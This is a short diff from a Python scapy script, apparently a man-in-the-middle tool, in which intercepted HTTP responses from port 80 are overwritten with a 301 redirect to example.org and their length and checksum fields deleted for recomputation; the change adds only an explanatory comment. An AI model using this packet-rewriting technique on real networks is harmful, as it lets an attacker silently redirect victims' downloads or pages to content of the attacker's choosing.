@@ -17,7 +17,7 @@ def process_packet(packet):
         elif scapy_packet[scapy.TCP].sport == 80: # Packet coming, meaning it is the response , 80 default number for http
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].ack)
-                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://www.example.org/index.asp\n\n"
+                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://www.example.org/index.asp\n\n" #changed from 200 OK to 301 Moved Permanently so we can redirect the TCP
                 # Need to delete so scapy can change to it to the modified pack
                 del scapy_packet[scapy.IP].len
                 del scapy_packet[scapy.IP].chksum
